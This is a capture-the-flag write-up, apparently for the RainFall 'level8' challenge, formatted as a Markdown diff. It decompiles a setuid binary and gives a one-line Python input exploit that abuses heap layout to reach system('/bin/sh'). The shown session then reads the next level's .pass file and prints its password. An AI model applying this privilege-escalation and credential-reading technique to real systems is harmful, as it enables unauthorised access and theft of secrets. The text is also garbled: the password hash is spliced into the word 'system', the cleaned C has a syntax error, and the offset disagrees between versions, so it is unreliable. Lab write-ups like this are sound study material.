@@ -1,1 +1,195 @@
 # level8
+
+Quick experimentation with the binary gives us :
+```sh
+level8@RainFall:~$ ./level8 a
+(nil), (nil) 
+level8@RainFall:~$ ./level8 a b
+(nil), (nil) 
+level8@RainFall:~$ ./level8 a b b
+(nil), (nil) 
+level8@RainFall:~$ ./level8 a b b
+(nil), (nil) 
+qwe
+(nil), (nil) 
+qwe
+(nil), (nil) 
+qwe
+(nil), (nil) 
+wq
+(nil), (nil) 
+^C
+```
+
+Let's disassemble.
+
+```c
+int main(void)
+{
+  char cVar1;
+  char *pcVar2;
+  int iVar3;
+  uint uVar4;
+  byte *pbVar5;
+  byte *pbVar6;
+  bool bVar7;
+  undefined uVar8;
+  undefined uVar9;
+  bool bVar10;
+  undefined uVar11;
+  byte bVar12;
+  byte local_90 [5];
+  char local_8b [2];
+  char acStack_89 [125];
+  
+  bVar12 = 0;
+  do {
+    printf("%p, %p \n",auth,service);
+    pcVar2 = fgets((char *)local_90,0x80,stdin);
+    bVar7 = false;
+    bVar10 = pcVar2 == (char *)0x0;
+    if (bVar10) {
+      return 0;
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"auth ";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      bVar7 = *pbVar5 < *pbVar6;
+      bVar10 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while (bVar10);
+    uVar8 = 0;
+    uVar11 = (!bVar7 && !bVar10) == bVar7;
+    if ((bool)uVar11) {
+      auth = (undefined4 *)malloc(4);
+      *auth = 0;
+      uVar4 = 0xffffffff;
+      pcVar2 = local_8b;
+      do {
+        if (uVar4 == 0) break;
+        uVar4 = uVar4 - 1;
+        cVar1 = *pcVar2;
+        pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
+      } while (cVar1 != '\0');
+      uVar4 = ~uVar4 - 1;
+      uVar8 = uVar4 < 0x1e;
+      uVar11 = uVar4 == 0x1e;
+      if (uVar4 < 0x1f) {
+        strcpy((char *)auth,local_8b);
+      }
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"reset";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar8 = *pbVar5 < *pbVar6;
+      uVar11 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar11);
+    uVar9 = 0;
+    uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
+    if ((bool)uVar8) {
+      free(auth);
+    }
+    iVar3 = 6;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"service";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar9 = *pbVar5 < *pbVar6;
+      uVar8 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar8);
+    uVar11 = 0;
+    uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
+    if ((bool)uVar8) {
+      uVar11 = (byte *)0xfffffff8 < local_90;
+      uVar8 = acStack_89 == (char *)0x0;
+      service = strdup(acStack_89);
+    }
+    iVar3 = 5;
+    pbVar5 = local_90;
+    pbVar6 = (byte *)"login";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      uVar11 = *pbVar5 < *pbVar6;
+      uVar8 = *pbVar5 == *pbVar6;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
+    } while ((bool)uVar8);
+    if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
+      if (auth[8] == 0) {
+        fwrite("Password:\n",1,10,stdout);
+      }
+      else {
+        system("/bin/sh");
+      }
+    }
+  } while( true );
+}
+```
+
+So, this time the code is a bit more complex. But it seems complex due to the fact that ghidra doesn't know the type of the variables. Let's fix that.
+
+```c
+int main(void)
+{
+    char buffer [128];
+
+    while (true) {
+        printf("%p, %p \n",auth,service);
+        if (!fgets(buffer,128,stdin);) {
+            return (0);
+        }
+        if (strncmp(buffer, "auth ", 5) == 0) {
+            auth = (char *)malloc(4);
+            auth[0] = 0;
+            if (strlen(buffer + 5) < 0x1f) {
+                strcpy(auth,buffer + 5);
+            }
+        }
+        if (strncmp(buffer, "reset", 5) == 0) {
+            free(auth);
+        }
+        if (strncmp(buffer, "service", 6) == 0) {
+            service = strdup(buffer + 8);
+        }
+        if (strncmp(buffer, "login", 5) == 0) {
+            auth[32] != 0 ? system("/bin/sh") : fwrite("Password:\n",1,10,stdout);
+        }
+    }
+}
+```
+
+So, we have 4 commands: auth, reset, service and login. Let's try to understand what they do.
+
+- auth: malloc 4 bytes and copy the string after "auth " in it.
+- reset: free the auth variable.
+- service: copy the string after "service" in the service variable.
+- login: if auth[32] is not null, call system("/bin/sh"), else print "Password:\n".
+
+So a quick solution would be to :
+
+1. auth (to malloc 4 bytes)
+2. 'service' followed by 16 bytes of padding
+3. login (to call sc542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8aystem("/bin/sh"))
+
+```sh
+$ (python -c "print 'auth '; print 'service' + 'A'*16; print 'login'"; cat -) | ./level8
+whoami
+level9
+id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+``````
